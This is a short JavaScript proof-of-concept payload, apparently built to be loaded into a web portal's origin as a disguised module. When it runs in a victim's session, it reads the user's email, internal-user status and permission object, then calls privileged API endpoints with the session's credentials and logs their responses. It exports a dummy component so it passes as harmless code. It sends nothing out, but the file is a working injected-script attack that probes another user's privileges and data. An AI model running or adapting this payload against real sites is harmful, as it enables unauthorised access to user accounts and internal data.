// Read-only privilege probe. Changes nothing. Exfiltrates no tokens or cookies.
// Serve as Content-Type: application/javascript with Access-Control-Allow-Origin: *
const READS = [
  "/v3/portalapi/GetPreviewBranches",           // canPreview -> PublicAPI_Documentation_Preview_InternalOnly
  "/secured/v3/scopecheck/manage-api-tokens",   // privilege oracle: ManageApiTokens
  "/secured/api/v3/portal"                      // privilege oracle: Api scope
];
const out = {
  origin: location.origin,
  user: window.UserInfo?.user?.email,
  ttdInternal: window.UserInfo?.user?.isTTDUser,
  perms: window.UserPermissions,
  reads: []
};
for (const p of READS) {
  try {
    const r = await fetch(p, { credentials: "same-origin", headers: { Accept: "application/json" } });
    out.reads.push({ path: p, status: r.status, body: (await r.text()).slice(0, 200) });
  } catch (e) {
    out.reads.push({ path: p, error: String(e).slice(0, 120) });
  }
}
console.log("PoC:", JSON.stringify(out, null, 2));
export const Component = () => null;
export default {};
